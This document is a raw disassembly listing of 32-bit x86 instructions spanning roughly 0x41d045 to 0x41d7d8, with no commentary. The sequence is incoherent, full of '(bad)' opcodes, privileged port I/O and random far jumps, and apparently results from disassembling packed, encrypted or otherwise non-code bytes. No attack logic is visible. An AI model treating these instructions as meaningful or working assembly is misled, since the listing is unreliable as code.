  41d045:	jno    0x41d099
  41d047:	cdq    
  41d048:	pop    ebp
  41d049:	xchg   ebp,eax
  41d04a:	imul   edi,ebx,0xffffffb6
  41d04d:	inc    ecx
  41d04e:	cwde   
  41d04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d050:	dec    ebp
  41d051:	fidiv  DWORD PTR [ebx]
  41d053:	lea    ecx,[edi]
  41d055:	xchg   ebp,eax
  41d056:	out    dx,eax
  41d057:	scas   eax,DWORD PTR es:[edi]
  41d058:	loopne 0x41d04a
  41d05a:	pop    ebx
  41d05b:	xor    eax,0xb3837ac2
  41d060:	mov    esi,0x8c45484c
  41d065:	xchg   edx,eax
  41d066:	adc    BYTE PTR [ebx],ch
  41d068:	or     cl,bh
  41d06a:	ja     0x41d02e
  41d06c:	sar    DWORD PTR [ecx+edi*4-0x60],1
  41d070:	iret   
  41d071:	cmp    DWORD PTR [eax],0x79264a51
  41d077:	and    esi,DWORD PTR [edx]
  41d079:	mov    edi,0x4f77c22b
  41d07e:	sub    ecx,ebp
  41d080:	and    eax,0xcb0fcb30
  41d085:	adc    DWORD PTR [edi+0x34494f7e],0xffffff99
  41d08c:	cmc    
  41d08d:	cmp    al,0x2d
  41d08f:	aam    0x4b
  41d091:	arpl   di,ax
  41d093:	adc    al,0xd
  41d095:	xchg   edx,eax
  41d096:	sti    
  41d097:	mov    eax,0x9f566092
  41d09c:	shr    BYTE PTR [edx+0x59],cl
  41d09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0a0:	mov    dl,0x2f
  41d0a2:	arpl   WORD PTR [edx+0x21b97a11],bp
  41d0a8:	hlt    
  41d0a9:	cmp    eax,0x5f6b49e0
  41d0ae:	add    esp,DWORD PTR [edx]
  41d0b0:	stos   DWORD PTR es:[edi],eax
  41d0b1:	stos   DWORD PTR es:[edi],eax
  41d0b2:	mov    ds:0xe40b44e3,al
  41d0b7:	loop   0x41d07a
  41d0b9:	fild   QWORD PTR [ebx+0x4af2280e]
  41d0bf:	xchg   BYTE PTR [edi-0x404d05fc],bl
  41d0c5:	fs sub ah,0x2b
  41d0c9:	(bad)  
  41d0cb:	enter  0x5ad7,0xf
  41d0cf:	add    al,0xa2
  41d0d1:	loopne 0x41d089
  41d0d3:	pop    edi
  41d0d4:	mov    bl,0xa5
  41d0d6:	sar    bh,0xd3
  41d0d9:	add    eax,0x25dc82ea
  41d0de:	mov    ch,0x76
  41d0e0:	xor    al,0x46
  41d0e2:	cwde   
  41d0e3:	jecxz  0x41d0ce
  41d0e5:	ins    BYTE PTR es:[edi],dx
  41d0e6:	fcomp  DWORD PTR [ebx]
  41d0e8:	addr16 jle 0x41d141
  41d0eb:	pusha  
  41d0ec:	aam    0x87
  41d0ee:	mov    edx,0xedffeb3a
  41d0f3:	dec    esp
  41d0f4:	adc    cl,bh
  41d0f6:	and    ch,al
  41d0f8:	mov    edx,0x866a68fe
  41d0fd:	adc    edx,esi
  41d0ff:	call   0xc300:0x817f4812
  41d106:	sub    edx,DWORD PTR [ecx-0x5]
  41d109:	adc    DWORD PTR [ecx],ebp
  41d10b:	aad    0x9f
  41d10d:	pop    ebx
  41d10e:	xchg   ebp,eax
  41d10f:	cmp    al,0x24
  41d111:	call   0x92c4:0x18f66d41
  41d118:	rcl    DWORD PTR [ecx-0xc],cl
  41d11b:	push   0xffffffe3
  41d11d:	mov    edx,ebp
  41d11f:	sub    bh,BYTE PTR ds:0x579cf1c5
  41d125:	xor    al,0xf3
  41d127:	dec    ecx
  41d128:	lods   al,BYTE PTR ds:[esi]
  41d129:	(bad)  
  41d12a:	mov    dl,0xb2
  41d12c:	addr16 dec eax
  41d12e:	ret    0xabb8
  41d131:	jbe    0x41d17f
  41d133:	jne    0x41d176
  41d135:	js     0x41d155
  41d137:	xchg   ecx,eax
  41d138:	sti    
  41d139:	and    eax,0xc7611b94
  41d13e:	add    ebp,esi
  41d140:	ins    BYTE PTR es:[edi],dx
  41d141:	jo     0x41d0e1
  41d143:	fiadd  WORD PTR [esi-0x755eee10]
  41d149:	push   esp
  41d14a:	or     ebx,DWORD PTR [ebx]
  41d14c:	sahf   
  41d14d:	pop    edx
  41d14e:	outs   dx,BYTE PTR ds:[esi]
  41d14f:	call   0x89e:0x5c6ccedb
  41d156:	outs   dx,DWORD PTR ds:[esi]
  41d157:	and    al,0xe7
  41d159:	les    edx,FWORD PTR [eax-0x33c62f20]
  41d15f:	mov    eax,ds:0xab829b9d
  41d164:	fcmovbe st,st(0)
  41d166:	aaa    
  41d167:	add    cl,BYTE PTR [edi]
  41d169:	and    bh,BYTE PTR [edi-0x54de8f7c]
  41d16f:	pop    esi
  41d170:	cmp    DWORD PTR [edi+0x23af8864],esi
  41d176:	adc    dh,bh
  41d178:	sti    
  41d179:	mov    WORD PTR [ecx-0x63],?
  41d17c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d17d:	mov    esp,0xc2ee9e4e
  41d182:	jb     0x41d12e
  41d184:	loopne 0x41d171
  41d186:	xlat   BYTE PTR ds:[ebx]
  41d187:	ret    
  41d188:	int3   
  41d189:	aas    
  41d18a:	pop    ebx
  41d18b:	ins    DWORD PTR es:[edi],dx
  41d18c:	lock out 0x6b,eax
  41d18f:	ret    
  41d190:	adc    al,0xf9
  41d192:	mov    esp,0xb354c5e8
  41d197:	mov    ch,0x3c
  41d199:	enter  0x627b,0xfa
  41d19d:	call   0xf63bca48
  41d1a2:	sar    BYTE PTR ds:0xc1384e77,0xde
  41d1a9:	cmp    DWORD PTR [esi],0xfffffffe
  41d1ac:	dec    ebp
  41d1ad:	(bad)  
  41d1ae:	jle    0x41d144
  41d1b0:	jecxz  0x41d1c5
  41d1b2:	(bad)  
  41d1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1b4:	xor    eax,0x52a438a
  41d1b9:	rol    BYTE PTR [ecx+0x2f],0xef
  41d1bd:	add    BYTE PTR ds:[ecx-0x587cfe83],0x6e
  41d1c5:	outs   dx,DWORD PTR ds:[esi]
  41d1c6:	mov    dh,BYTE PTR [ebx+0x7d]
  41d1c9:	and    ch,BYTE PTR [ebx+ebp*8+0x20]
  41d1cd:	xor    al,0xa8
  41d1cf:	push   cs
  41d1d0:	test   al,0x67
  41d1d2:	xchg   edi,eax
  41d1d3:	or     DWORD PTR [eax],edx
  41d1d5:	leave  
  41d1d6:	test   BYTE PTR [ecx-0x19],dh
  41d1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1da:	mov    edx,ebp
  41d1dc:	fwait
  41d1dd:	xor    bh,cl
  41d1df:	rcr    BYTE PTR [ebx+0x72e50969],1
  41d1e5:	jne    0x41d1ee
  41d1e7:	sub    esi,DWORD PTR [edx-0x67]
  41d1ea:	inc    eax
  41d1eb:	ins    DWORD PTR es:[edi],dx
  41d1ec:	and    al,0xb9
  41d1ee:	add    al,BYTE PTR ds:0xcd5a541
  41d1f4:	push   ss
  41d1f5:	in     al,0xbd
  41d1f7:	scas   eax,DWORD PTR es:[edi]
  41d1f8:	mov    al,0x66
  41d1fa:	lock inc esi
  41d1fc:	cmc    
  41d1fd:	fnstenv [eax+0x52]
  41d200:	jl     0x41d247
  41d202:	jb     0x41d272
  41d204:	aas    
  41d205:	mov    WORD PTR [ecx],ss
  41d207:	fwait
  41d208:	mov    eax,ds:0x83baa436
  41d20d:	jp     0x41d281
  41d20f:	xor    ah,BYTE PTR [ecx]
  41d211:	jmp    0x9ab3:0x915f3857
  41d218:	aaa    
  41d219:	push   es
  41d21a:	ret    
  41d21b:	sti    
  41d21c:	jp     0x41d25f
  41d21e:	inc    ebx
  41d21f:	cmc    
  41d220:	add    ebp,0xffffff8a
  41d223:	cwde   
  41d224:	(bad)
  41d228:	cmc    
  41d229:	jecxz  0x41d1be
  41d22b:	ror    DWORD PTR [edi-0x3d],0x22
  41d22f:	ds push esi
  41d231:	shl    dh,1
  41d233:	xchg   edx,eax
  41d234:	add    ebp,DWORD PTR [edx]
  41d236:	scas   al,BYTE PTR es:[edi]
  41d237:	mov    al,BYTE PTR [edx]
  41d239:	cmp    cl,ah
  41d23b:	sub    ebx,ecx
  41d23d:	jns    0x41d1c6
  41d23f:	arpl   WORD PTR [ecx],cx
  41d241:	push   ss
  41d242:	fcom   QWORD PTR [ebp+0x3065e99a]
  41d248:	(bad)  
  41d249:	frstor [edi+0x3]
  41d24c:	dec    ebp
  41d24d:	retf   
  41d24e:	mov    al,0x96
  41d250:	rol    BYTE PTR [edx-0x77],cl
  41d253:	jmp    0x93a5:0xa9732087
  41d25a:	mov    ah,dl
  41d25c:	sub    cl,BYTE PTR ds:0xd93ccc05
  41d262:	or     eax,0x589fa87d
  41d267:	sub    al,0x2c
  41d269:	lds    esi,FWORD PTR ds:0xaec4f077
  41d26f:	fnstsw WORD PTR [edx*1-0x119305]
  41d276:	(bad)  
  41d277:	ret    0x1afe
  41d27a:	jg     0x41d28f
  41d27c:	inc    ebp
  41d27d:	or     dh,bh
  41d27f:	adc    edx,DWORD PTR [edx+0x4a]
  41d282:	mov    bl,0x3
  41d284:	or     eax,0x68f0e079
  41d289:	(bad)
  41d28c:	sbb    BYTE PTR [esi-0x76],0xd5
  41d290:	mov    esi,0x7f458641
  41d295:	jge    0x41d2a4
  41d297:	xor    DWORD PTR [ebx+0x79],0xc78ce1c2
  41d29e:	sub    ah,dh
  41d2a0:	xor    dl,dl
  41d2a2:	xchg   ebp,eax
  41d2a3:	sub    DWORD PTR [eax],0xd30fcd3f
  41d2a9:	inc    edi
  41d2aa:	xchg   ecx,eax
  41d2ab:	mov    eax,ds:0x586d990d
  41d2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2b1:	dec    eax
  41d2b2:	and    al,0x73
  41d2b4:	pop    ds
  41d2b5:	and    bh,al
  41d2b7:	add    ebx,edi
  41d2b9:	(bad)  
  41d2ba:	clc    
  41d2bb:	or     DWORD PTR [esi+0x402f7489],edx
  41d2c1:	cmp    esp,0xa193d868
  41d2c7:	imul   esp,DWORD PTR [esi-0x3fbd27de],0x9ad14b29
  41d2d1:	and    al,0x73
  41d2d3:	fist   DWORD PTR [eax+eiz*4+0x57]
  41d2d7:	lods   eax,DWORD PTR ds:[esi]
  41d2d8:	xor    BYTE PTR [ebx+eiz*1],dh
  41d2db:	xchg   DWORD PTR [esi+0x7363a093],ebx
  41d2e1:	add    eax,0x8804925
  41d2e6:	ja     0x41d328
  41d2e8:	pushf  
  41d2e9:	aas    
  41d2ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2eb:	or     DWORD PTR [ebx+0x57aa2f81],edx
  41d2f1:	lods   eax,DWORD PTR ds:[esi]
  41d2f2:	in     al,dx
  41d2f3:	mov    gs,WORD PTR ds:0x5767b9f8
  41d2f9:	xchg   edx,eax
  41d2fa:	mov    eax,0x46a7d254
  41d2ff:	dec    ecx
  41d300:	stc    
  41d301:	test   DWORD PTR [esi],0x2f2b4629
  41d307:	(bad)  
  41d308:	adc    dl,BYTE PTR [edi]
  41d30a:	or     edi,DWORD PTR [edi]
  41d30c:	mov    ebx,0x31cf969f
  41d311:	push   0xffffff9b
  41d313:	or     eax,0xfab3bb94
  41d318:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41d31a:	inc    DWORD PTR [ecx-0x10]
  41d31d:	jne    0x41d2c0
  41d31f:	in     al,dx
  41d320:	jb     0x41d335
  41d322:	sub    eax,0xb39aa48a
  41d327:	jo     0x41d3a3
  41d329:	jnp    0x41d302
  41d32b:	(bad)  
  41d32d:	jo     0x41d32e
  41d32f:	shr    DWORD PTR [ebx+0x7d02555e],0xa4
  41d336:	lock jge 0x41d348
  41d339:	cmp    DWORD PTR [edx+ebp*8-0x59],ebp
  41d33d:	test   DWORD PTR [edi+0x0],0xae33ad34
  41d344:	fsubr  QWORD PTR [ebx+0x435b574b]
  41d34a:	je     0x41d353
  41d34c:	jne    0x41d3b6
  41d34e:	js     0x41d3bf
  41d350:	add    eax,0x31b85e23
  41d355:	imul   ebx,DWORD PTR [ebx-0x2c],0xffffffed
  41d359:	lock add DWORD PTR cs:[ecx+0x49ee0059],esi
  41d361:	stos   BYTE PTR es:[edi],al
  41d362:	mov    edi,0x6e7b5e6d
  41d367:	sbb    al,0xae
  41d369:	mov    edx,0xd13866d4
  41d36e:	jbe    0x41d33a
  41d370:	xorps  xmm6,xmm6
  41d373:	xchg   ebx,eax
  41d374:	mov    DWORD PTR [ebp-0x88703d2],esi
  41d37a:	stos   DWORD PTR es:[edi],eax
  41d37b:	mov    eax,ds:0xa8e73d03
  41d380:	retf   
  41d381:	(bad)
  41d384:	mov    bl,dh
  41d386:	div    BYTE PTR [edx+eax*4-0x72b851a]
  41d38d:	lock mov edi,0x4aaed8d1
  41d393:	ret    
  41d394:	retf   
  41d395:	xchg   esi,eax
  41d396:	ret    0x644d
  41d399:	jne    0x41d3ac
  41d39b:	mul    BYTE PTR [ebp-0x5a]
  41d39e:	and    DWORD PTR [esi],0xb362ef2c
  41d3a4:	hlt    
  41d3a5:	jp     0x41d3c3
  41d3a7:	adc    DWORD PTR [esi+0x61],ecx
  41d3aa:	adc    BYTE PTR [ecx-0x16f3f3fe],ah
  41d3b0:	ret    
  41d3b1:	ffreep st(5)
  41d3b3:	mov    eax,0x5a4f536f
  41d3b8:	aaa    
  41d3b9:	and    edi,DWORD PTR [edx+0x5a]
  41d3bc:	(bad)  
  41d3bd:	and    al,0xee
  41d3bf:	cld    
  41d3c0:	sahf   
  41d3c1:	dec    edi
  41d3c2:	test   DWORD PTR [edi+eiz*4],ebp
  41d3c5:	ja     0x41d427
  41d3c7:	pop    ecx
  41d3c8:	outs   dx,DWORD PTR ds:[esi]
  41d3c9:	sbb    BYTE PTR [edi+0x3e],bl
  41d3cc:	push   esp
  41d3cd:	dec    edx
  41d3ce:	ins    BYTE PTR es:[edi],dx
  41d3cf:	push   eax
  41d3d0:	(bad)  
  41d3d1:	out    0xb9,eax
  41d3d3:	outs   dx,DWORD PTR ds:[esi]
  41d3d4:	jmp    0xfab3:0x1d1a7cd5
  41d3db:	xchg   DWORD PTR cs:[ebx-0x430e0b4f],ebx
  41d3e2:	outs   dx,BYTE PTR ds:[esi]
  41d3e3:	inc    eax
  41d3e4:	fnstcw WORD PTR [ecx]
  41d3e6:	mov    ebp,0xdaedc649
  41d3eb:	sub    edx,edx
  41d3ed:	mov    edx,0x1f15329a
  41d3f2:	cs xchg ebp,eax
  41d3f4:	aas    
  41d3f5:	leave  
  41d3f6:	mov    ch,0xc2
  41d3f8:	loope  0x41d458
  41d3fa:	hlt    
  41d3fb:	adc    esp,0x4c6db1ad
  41d401:	ja     0x41d3ce
  41d403:	mov    edi,0xdf965c3d
  41d408:	push   ecx
  41d409:	mov    al,ds:0xa836df04
  41d40e:	aas    
  41d40f:	xchg   DWORD PTR [edx],esp
  41d411:	imul   BYTE PTR [esi]
  41d413:	hlt    
  41d414:	and    eax,esp
  41d416:	clc    
  41d417:	mov    ds:0xac0373b1,eax
  41d41c:	or     DWORD PTR [eax],0xffffffa7
  41d41f:	mov    esp,0x416c6e6f
  41d424:	lea    edx,[edi]
  41d426:	(bad)
  41d42a:	arpl   si,bx
  41d42c:	int3   
  41d42d:	pop    esp
  41d42e:	outs   dx,DWORD PTR ds:[esi]
  41d42f:	pop    es
  41d430:	push   es
  41d431:	mov    bl,0x8
  41d433:	adc    eax,0x894762c0
  41d438:	shr    BYTE PTR [eax*1-0x43d2d04],cl
  41d43f:	jne    0x41d48c
  41d441:	jle    0x41d3f3
  41d443:	sub    ah,BYTE PTR [ecx+0x70]
  41d446:	ins    BYTE PTR es:[edi],dx
  41d447:	mov    eax,ds:0xa67bc371
  41d44c:	mov    ecx,0x88124736
  41d451:	ror    ebp,cl
  41d453:	(bad)  
  41d455:	sbb    BYTE PTR ds:0x44ea29b8,dh
  41d45b:	mov    edx,DWORD PTR [ecx-0x4f]
  41d45e:	fisubr DWORD PTR [edi+0xd]
  41d461:	add    ebp,DWORD PTR [ecx]
  41d463:	repz mov eax,ds:0x6ae2a343
  41d469:	into   
  41d46a:	mov    gs,WORD PTR [edx+0x267c1e08]
  41d470:	retf   0x47e0
  41d473:	jmp    0xc4803b83
  41d478:	cmp    ah,bh
  41d47a:	adc    ebp,DWORD PTR [esi]
  41d47c:	popa   
  41d47d:	popf   
  41d47e:	xchg   edi,ebp
  41d480:	mov    WORD PTR [ecx-0x4425fddf],ss
  41d486:	inc    edx
  41d487:	sub    DWORD PTR [edi+ebx*2+0x15],eax
  41d48b:	xor    BYTE PTR [edx],al
  41d48d:	outs   dx,BYTE PTR ds:[esi]
  41d48e:	dec    edi
  41d48f:	or     DWORD PTR [edi],eax
  41d491:	adc    al,0x6d
  41d493:	jp     0x41d4b6
  41d495:	mov    dl,0xe7
  41d497:	fidiv  DWORD PTR [eax-0x16e305be]
  41d49d:	pop    esi
  41d49e:	lock ficom DWORD PTR [edi+0x66670ecd]
  41d4a5:	xor    cl,cl
  41d4a7:	std    
  41d4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4a9:	pop    edx
  41d4aa:	mov    ds:0xbc137b9b,al
  41d4af:	retf   
  41d4b0:	dec    esi
  41d4b1:	sub    cl,BYTE PTR [esi]
  41d4b3:	or     ebx,DWORD PTR [esi+edx*1]
  41d4b6:	pop    ss
  41d4b7:	clc    
  41d4b8:	xor    edi,DWORD PTR [edi-0x44]
  41d4bb:	lods   eax,DWORD PTR ds:[esi]
  41d4bc:	add    DWORD PTR [ebx+0x44],0xffffffeb
  41d4c0:	movlhps xmm0,xmm7
  41d4c3:	test   DWORD PTR [edi-0x155e4638],0x4e06958
  41d4cd:	aad    0x99
  41d4cf:	xchg   DWORD PTR [edi-0x59a3a79],edi
  41d4d5:	jle    0x41d518
  41d4d7:	pop    ds
  41d4d8:	cmp    eax,0x8711ce9a
  41d4dd:	push   ebp
  41d4de:	fimul  DWORD PTR [edx-0x5]
  41d4e1:	ins    DWORD PTR es:[edi],dx
  41d4e2:	jmp    0x6c1474b0
  41d4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4e8:	lahf   
  41d4e9:	jmp    0x41d4d9
  41d4eb:	lds    eax,FWORD PTR [ebx-0x1e]
  41d4ee:	(bad)  [ebp-0x6b]
  41d4f1:	sub    al,0x2c
  41d4f3:	(bad)  
  41d4f4:	mov    eax,0xb118be0
  41d4f9:	in     eax,0x9f
  41d4fb:	sub    al,0xf2
  41d4fd:	sbb    eax,0x7a79e7be
  41d502:	add    ebp,DWORD PTR gs:[edi+edi*2-0x6a8af055]
  41d50a:	hlt    
  41d50b:	add    eax,esi
  41d50d:	xor    eax,0xe09f589e
  41d512:	push   eax
  41d513:	jg     0x41d58d
  41d515:	mov    edi,0x31c02948
  41d51a:	and    al,0xf
  41d51c:	imul   edi,DWORD PTR [ecx+0x34ae3f16],0xffffffd0
  41d523:	int3   
  41d524:	(bad)  
  41d525:	in     al,dx
  41d526:	or     ebx,DWORD PTR [ecx+0x73]
  41d529:	adc    al,0x67
  41d52b:	dec    edx
  41d52c:	hlt    
  41d52d:	mov    esi,0x22ebe205
  41d532:	jmp    0xca5f:0x7e65dc39
  41d539:	push   esp
  41d53a:	and    al,0x2a
  41d53c:	dec    esp
  41d53d:	jno    0x41d592
  41d53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d540:	adc    bl,BYTE PTR [edx]
  41d542:	dec    esp
  41d543:	ins    DWORD PTR es:[edi],dx
  41d544:	sub    ecx,edx
  41d546:	push   edx
  41d547:	mov    edi,0xf9193c7b
  41d54c:	mov    ds:0xed52bdf4,eax
  41d551:	dec    ecx
  41d552:	xchg   ebp,eax
  41d553:	lods   eax,DWORD PTR ds:[esi]
  41d554:	cmp    BYTE PTR [edx],0x37
  41d557:	inc    edi
  41d558:	(bad)  
  41d559:	(bad)  
  41d55a:	lahf   
  41d55b:	retf   
  41d55c:	imul   esi,DWORD PTR [esp+eax*8+0x621460be],0x8f7ed9c1
  41d567:	cmp    BYTE PTR [edi-0x7c22b1fa],0xcb
  41d56e:	pop    eax
  41d56f:	mov    edx,0x93894937
  41d574:	mov    esi,0x60ee4b4d
  41d579:	sti    
  41d57a:	pop    esi
  41d57b:	sahf   
  41d57c:	sub    DWORD PTR [edx+ecx*4+0x42],0x79
  41d581:	mov    WORD PTR [ebp+0x50e49e9c],es
  41d587:	(bad)  
  41d588:	xchg   edx,eax
  41d589:	push   ebp
  41d58a:	dec    DWORD PTR ds:0x777e92df
  41d590:	jo     0x41d5e8
  41d592:	jle    0x41d522
  41d594:	dec    edi
  41d595:	out    dx,al
  41d596:	cdq    
  41d597:	enter  0x6cbf,0xa1
  41d59b:	mov    db7,ecx
  41d59e:	xchg   ebp,eax
  41d59f:	jge    0x41d5d2
  41d5a1:	add    bh,bl
  41d5a3:	in     eax,0x9d
  41d5a5:	mov    edi,0x49e4de9c
  41d5aa:	jno    0x41d5bb
  41d5ac:	jp     0x41d5ec
  41d5ae:	add    BYTE PTR [edx-0x43cf309b],cl
  41d5b4:	ficom  DWORD PTR [edx+0x61e1905d]
  41d5ba:	rol    DWORD PTR [edi+0x71],cl
  41d5bd:	ja     0x41d5da
  41d5bf:	cmp    eax,DWORD PTR [eax-0x7]
  41d5c2:	into   
  41d5c3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d5c5:	jp     0x41d637
  41d5c7:	cmp    DWORD PTR [ebp-0x2f],eax
  41d5ca:	aad    0xe9
  41d5cc:	(bad)  
  41d5cd:	or     eax,0x1ee9b42e
  41d5d2:	ficom  DWORD PTR [edi+0x7a]
  41d5d5:	sbb    al,al
  41d5d7:	gs push esp
  41d5d9:	push   esi
  41d5da:	mov    es,WORD PTR [edi+0x5f661952]
  41d5e0:	or     eax,0x314674fa
  41d5e5:	je     0x41d570
  41d5e7:	push   ss
  41d5e8:	int    0x45
  41d5ea:	ins    DWORD PTR es:[edi],dx
  41d5eb:	add    dh,ch
  41d5ed:	mov    ch,0xd9
  41d5ef:	lahf   
  41d5f0:	in     eax,0xa4
  41d5f2:	fstp   TBYTE PTR [ebx]
  41d5f4:	cmp    edx,ebx
  41d5f6:	mov    edx,0xb811ea20
  41d5fb:	or     eax,DWORD PTR gs:[edx+ebp*2]
  41d5ff:	in     al,dx
  41d600:	ja     0x41d604
  41d602:	pop    ss
  41d603:	outs   dx,BYTE PTR ds:[esi]
  41d604:	mov    edx,0x4e4a993c
  41d609:	leave  
  41d60a:	icebp  
  41d60b:	das    
  41d60c:	lods   al,BYTE PTR ds:[esi]
  41d60d:	mov    eax,0x348270f7
  41d612:	or     DWORD PTR [edi],esi
  41d614:	fisub  WORD PTR [ebx+eax*4]
  41d617:	dec    esi
  41d618:	mov    ebx,0x6ccf85f6
  41d61d:	jg     0x41d66e
  41d61f:	mov    edx,0x379fccbc
  41d624:	mov    al,ds:0x1ae3d773
  41d629:	add    DWORD PTR ss:[ebx+eax*2+0x660cc812],ebx
  41d631:	xor    dl,BYTE PTR ds:0x87bc75d5
  41d637:	push   ebp
  41d638:	sbb    BYTE PTR [esi-0x3f627e06],ah
  41d63e:	rol    DWORD PTR [eax],1
  41d640:	cmp    eax,0x9f880581
  41d645:	mov    bh,0xb2
  41d647:	out    0x72,eax
  41d649:	mov    ebx,0xcee96cb7
  41d64e:	sbb    cl,BYTE PTR [eax]
  41d650:	(bad)  
  41d651:	enter  0xaa84,0x5c
  41d655:	jae    0x41d68a
  41d657:	mov    ecx,ebp
  41d659:	add    eax,0x80372953
  41d65e:	popa   
  41d65f:	outs   dx,DWORD PTR ds:[esi]
  41d660:	pop    eax
  41d661:	out    dx,al
  41d662:	leave  
  41d663:	mov    edx,0xfa799100
  41d668:	mov    DWORD PTR ds:0xd95b1362,esi
  41d66e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d66f:	aad    0x38
  41d671:	popa   
  41d672:	jne    0x41d686
  41d674:	pop    es
  41d675:	add    BYTE PTR [bp+0x4d],bl
  41d679:	jmp    0x8c382343
  41d67e:	aaa    
  41d67f:	push   esi
  41d680:	jge    0x41d6d1
  41d682:	imul   ecx,ebp,0x6c924c7
  41d688:	sub    eax,DWORD PTR [esi+0x52]
  41d68b:	cs (bad) 
  41d68e:	scas   al,BYTE PTR es:[edi]
  41d68f:	out    dx,eax
  41d690:	mov    fs,eax
  41d692:	cwde   
  41d693:	shr    ebx,0xd
  41d696:	fisubr DWORD PTR [edx-0x4ddc3972]
  41d69c:	mov    al,0x61
  41d69e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d69f:	aaa    
  41d6a0:	mul    BYTE PTR [edx]
  41d6a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6a3:	xchg   BYTE PTR ds:0xd54b377e,bl
  41d6a9:	pop    ss
  41d6aa:	lods   eax,DWORD PTR ds:[esi]
  41d6ab:	adc    bh,BYTE PTR [esi+ecx*8-0x7]
  41d6af:	leave  
  41d6b0:	push   edx
  41d6b1:	ins    BYTE PTR es:[edi],dx
  41d6b2:	mov    bl,0x66
  41d6b4:	ins    BYTE PTR es:[edi],dx
  41d6b5:	icebp  
  41d6b6:	daa    
  41d6b7:	pushf  
  41d6b8:	adc    esp,DWORD PTR [ecx+edx*8]
  41d6bb:	stos   BYTE PTR es:[edi],al
  41d6bc:	add    DWORD PTR ds:0x6fbdae76,0x1e962e2a
  41d6c6:	daa    
  41d6c7:	xchg   edi,eax
  41d6c8:	mov    WORD PTR ds:[ecx+0x4b],?
  41d6cc:	and    edx,DWORD PTR [edx+0x27]
  41d6cf:	adc    DWORD PTR [eax+edx*1-0x31],ebx
  41d6d3:	xchg   edx,eax
  41d6d4:	or     al,0x5e
  41d6d6:	fs aas 
  41d6d8:	adc    BYTE PTR [ebx+0x41],ah
  41d6db:	mov    ecx,0x9d0827b3
  41d6e0:	in     al,0x96
  41d6e2:	sub    al,al
  41d6e4:	(bad)  
  41d6e5:	hlt    
  41d6e6:	inc    edi
  41d6e7:	xor    dh,BYTE PTR [eax]
  41d6e9:	mov    eax,DWORD PTR [ecx]
  41d6eb:	or     BYTE PTR [eax-0x49],dh
  41d6ee:	out    dx,al
  41d6ef:	repz out dx,eax
  41d6f1:	or     ah,BYTE PTR [eax+0x3eb9c8ca]
  41d6f7:	add    eax,0xdf185928
  41d6fc:	inc    ebp
  41d6fd:	dec    eax
  41d6fe:	cmp    eax,0x85e47eb0
  41d703:	jmp    0xaecfee57
  41d708:	add    ebx,DWORD PTR [ecx]
  41d70a:	cmp    DWORD PTR [eax],ecx
  41d70c:	jnp    0x41d770
  41d70e:	and    DWORD PTR [esi+0x3c1ade3b],0xd22d5120
  41d718:	mov    eax,DWORD PTR [esp+edi*4-0x5]
  41d71c:	imul   edi,DWORD PTR [edx+edx*8-0x45d1273e],0xfdfcc88b
  41d727:	push   esi
  41d728:	dec    edx
  41d729:	mov    ebp,0xb8f5537e
  41d72e:	jae    0x41d728
  41d730:	cmc    
  41d731:	dec    edx
  41d732:	xor    al,0x52
  41d734:	div    cl
  41d736:	inc    ecx
  41d737:	push   ebx
  41d738:	sub    BYTE PTR [bx],ah
  41d73b:	mov    eax,es:0x9edf6088
  41d741:	ret    
  41d742:	mov    ch,BYTE PTR [ecx+0xb74856b]
  41d748:	inc    edi
  41d749:	into   
  41d74a:	dec    edx
  41d74b:	out    0x21,al
  41d74d:	das    
  41d74e:	sbb    BYTE PTR [esi+esi*4],ah
  41d751:	clc    
  41d752:	pushf  
  41d753:	push   ebx
  41d754:	pop    eax
  41d755:	push   eax
  41d756:	dec    esp
  41d757:	dec    ecx
  41d758:	test   BYTE PTR [edi-0x5229f7b5],0x4d
  41d75f:	xchg   esp,eax
  41d760:	retf   
  41d761:	arpl   bx,si
  41d763:	cmp    ah,BYTE PTR [edx+0x5d3dc59d]
  41d769:	rol    bl,0x69
  41d76c:	sbb    eax,DWORD PTR [ebx]
  41d76e:	mov    bl,0x13
  41d770:	jp     0x41d7d3
  41d772:	jae    0x41d79d
  41d774:	ds ja  0x41d70f
  41d777:	sub    al,0x37
  41d779:	pop    ss
  41d77a:	jno    0x41d6fd
  41d77c:	inc    eax
  41d77d:	jo     0x41d770
  41d77f:	pop    ecx
  41d780:	sbb    al,0x34
  41d782:	mov    ah,0x33
  41d784:	sub    esp,DWORD PTR [eax-0x3c]
  41d787:	imul   ecx,esi,0xffffffb9
  41d78a:	sbb    DWORD PTR [ecx-0x50],0x6b
  41d78e:	cdq    
  41d78f:	icebp  
  41d790:	mov    esi,0x879ff5f2
  41d795:	dec    esi
  41d797:	aam    0x52
  41d799:	or     eax,edi
  41d79b:	sbb    eax,0x2ce872ff
  41d7a0:	aas    
  41d7a1:	mov    bl,0x67
  41d7a3:	xor    BYTE PTR [edi],bh
  41d7a5:	int3   
  41d7a6:	nop
  41d7a7:	gs std 
  41d7a9:	add    BYTE PTR [ebx+0x7e42ef38],0xd9
  41d7b0:	dec    ecx
  41d7b1:	(bad)  
  41d7b2:	in     eax,dx
  41d7b3:	fdivr  DWORD PTR [eax-0x5b]
  41d7b6:	adc    al,0xb3
  41d7b8:	fldcw  WORD PTR [edx]
  41d7ba:	popa   
  41d7bb:	sub    DWORD PTR [eax-0x74abb739],0x28497d7a
  41d7c5:	fnstenv [edi]
  41d7c7:	mov    ebx,0xc5d48366
  41d7cc:	or     ecx,esi
  41d7ce:	mov    esi,0x4e2b1097
  41d7d3:	ficom  DWORD PTR [ecx+0x3a]
  41d7d6:	out    0x15,eax
  41d7d8:	cmp    DWORD PTR [edx+0x65fc3bf5],ebp
